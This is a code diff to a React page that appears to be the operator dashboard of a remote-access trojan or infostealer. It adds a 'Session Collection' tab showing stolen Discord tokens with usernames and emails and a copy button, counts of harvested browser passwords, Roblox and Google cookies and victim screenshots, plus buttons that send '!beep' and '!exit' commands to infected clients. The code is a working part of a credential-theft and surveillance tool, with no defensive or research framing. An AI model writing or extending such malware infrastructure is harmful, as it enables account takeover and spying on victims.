@@ -98,7 +98,7 @@ export default function ClientDetailPage() {
   const router = useRouter()
   const [client, setClient] = useState<any>(null)
   const [loading, setLoading] = useState(true)
-  const [activeTab, setActiveTab] = useState<"overview" | "screen" | "terminal" | "files" | "screenshots" | "map" | "data">("screen")
+  const [activeTab, setActiveTab] = useState<"overview" | "screen" | "terminal" | "files" | "screenshots" | "map" | "data" | "basedata">("screen")
   const [command, setCommand] = useState("")
   const [commandHistory, setCommandHistory] = useState<any[]>([])
   const [sending, setSending] = useState(false)
@@ -149,7 +149,7 @@ export default function ClientDetailPage() {
   }
 
   useEffect(() => {
-    if (activeTab === "data" && params.id) fetchExfilData()
+    if ((activeTab === "data" || activeTab === "basedata") && params.id) fetchExfilData()
   }, [activeTab, params.id])
 
   // Auto-refresh every 15s
@@ -246,6 +246,7 @@ export default function ClientDetailPage() {
     { id: "terminal" as const, label: "Commands", icon: "M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z M14 2v6h6" },
     { id: "screenshots" as const, label: "Gallery", icon: "M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01" },
     { id: "data" as const, label: "Data", icon: "M4 7v10c0 2 1 3 3 3h10c2 0 3-1 3-3V7M9 3h6M12 3v4" },
+    { id: "basedata" as const, label: "Session", icon: "M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" },
   ]
 
   return (
@@ -412,6 +413,7 @@ export default function ClientDetailPage() {
                 { label: "System Info", cmd: "!sysinfo", emoji: "🖥️" },
                 { label: "Start Stream", cmd: "", emoji: "📺", action: () => { setActiveTab("screen"); toggleStream() } },
                 { label: "Geolocate", cmd: "!geolocate", emoji: "📍" },
+                { label: "Beep", cmd: "!beep", emoji: "🔊" },
               ].map(item => (
                 <button
                   key={item.label}
@@ -709,6 +711,111 @@ export default function ClientDetailPage() {
               ))}
             </>
           )}
+        </div>
+      )}
+
+      {/* BASEDATA TAB — Session Collection */}
+      {activeTab === "basedata" && (
+        <div className="space-y-4">
+          <div className="flex items-center justify-between">
+            <h2 className="text-sm font-semibold uppercase tracking-wider text-zinc-400">💾 Session Collection</h2>
+            <Button size="sm" onClick={fetchExfilData} loading={exfilLoading}>Refresh</Button>
+          </div>
+
+          <div className="grid md:grid-cols-3 lg:grid-cols-5 gap-3">
+            <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60 text-center">
+              <span className="text-3xl font-bold text-yellow-400">{exfilByType["discord_token"]?.length || 0}</span>
+              <p className="text-[10px] text-zinc-500 uppercase mt-1">Discord</p>
+            </div>
+            <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60 text-center">
+              <span className="text-3xl font-bold text-blue-400">{exfilByType["browser_passwords"]?.length || 0}</span>
+              <p className="text-[10px] text-zinc-500 uppercase mt-1">Passwords</p>
+            </div>
+            <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60 text-center">
+              <span className="text-3xl font-bold text-green-400">{client.screenCaptures?.length || 0}</span>
+              <p className="text-[10px] text-zinc-500 uppercase mt-1">Screenshots</p>
+            </div>
+            <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60 text-center">
+              <span className="text-3xl font-bold text-orange-400">{exfilByType["roblox_cookies"]?.length || 0}</span>
+              <p className="text-[10px] text-zinc-500 uppercase mt-1">Roblox</p>
+            </div>
+            <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60 text-center">
+              <span className="text-3xl font-bold text-red-400">{exfilByType["google_cookies"]?.length || 0}</span>
+              <p className="text-[10px] text-zinc-500 uppercase mt-1">Google</p>
+            </div>
+          </div>
+
+          {/* Discord Tokens */}
+          {exfilByType["discord_token"]?.length > 0 && (
+            <div className="rounded-xl border border-yellow-500/20 bg-zinc-900/60 overflow-hidden">
+              <div className="p-3 border-b border-zinc-800 bg-yellow-500/5">
+                <h3 className="text-xs font-semibold text-yellow-400">💬 Discord Tokens</h3>
+              </div>
+              <div className="divide-y divide-zinc-800 max-h-60 overflow-y-auto">
+                {exfilByType["discord_token"].map((item: any) => {
+                  let p: any = {}
+                  try { p = JSON.parse(item.data) } catch {}
+                  return (
+                    <div key={item.id} className="p-3 hover:bg-zinc-800/30">
+                      <div className="flex items-center gap-2 text-[10px]">
+                        <span className="text-zinc-500">User:</span>
+                        <span className="text-white font-medium">{p.username || "?"}</span>
+                        {p.email && <span className="text-zinc-400">({p.email})</span>}
+                      </div>
+                      <div className="flex items-center gap-2 mt-1">
+                        <code className="text-[10px] text-zinc-500 bg-black/40 px-2 py-0.5 rounded font-mono flex-1 truncate">{p.token?.substring(0, 40)}...</code>
+                        <button onClick={() => { navigator.clipboard.writeText(p.token || item.data) }} className="text-[9px] px-1.5 py-0.5 rounded bg-zinc-700 hover:bg-zinc-600 text-zinc-300 shrink-0">Copy</button>
+                      </div>
+                    </div>
+                  )
+                })}
+              </div>
+            </div>
+          )}
+
+          {/* Screenshots */}
+          {client.screenCaptures?.length > 0 && (
+            <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
+              <div className="p-3 border-b border-zinc-800">
+                <h3 className="text-xs font-semibold text-green-400">📸 Screenshots</h3>
+              </div>
+              <div className="p-3 grid grid-cols-3 gap-2 max-h-60 overflow-y-auto">
+                {client.screenCaptures.map((sc: any) => (
+                  <img key={sc.id} src={sc.imagePath} alt="Screen" className="rounded-lg border border-zinc-700 cursor-pointer hover:border-primary/50 hover:scale-105 transition-all" onClick={() => { setScreenshot(sc.imagePath); setActiveTab("screen") }} />
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* End Session Button */}
+          <div className="rounded-2xl border border-red-500/20 bg-red-500/5 p-6">
+            <div className="flex items-start gap-4">
+              <div className="w-12 h-12 rounded-xl bg-red-500/10 flex items-center justify-center text-2xl shrink-0">
+                ⏹️
+              </div>
+              <div className="flex-1">
+                <h3 className="text-sm font-bold text-red-400">End Session & Save Data</h3>
+                <p className="text-xs text-zinc-400 mt-1">
+                  This will save all collected tokens, passwords, screenshots, and system info to the Data Base.
+                  The client connection will be terminated and the session finalized.
+                </p>
+                <div className="flex items-center gap-3 mt-4">
+                  <Button
+                    variant="danger"
+                    onClick={async () => {
+                      try {
+                        await sendCommand("!exit")
+                        toast.success("Exit command sent. Session ending...")
+                      } catch { toast.error("Failed to send exit") }
+                    }}
+                  >
+                    🔴 End Session
+                  </Button>
+                  <p className="text-[10px] text-zinc-500">All collected data is already saved to Data Base.</p>
+                </div>
+              </div>
+            </div>
+          </div>
         </div>
       )}
     </motion.div>
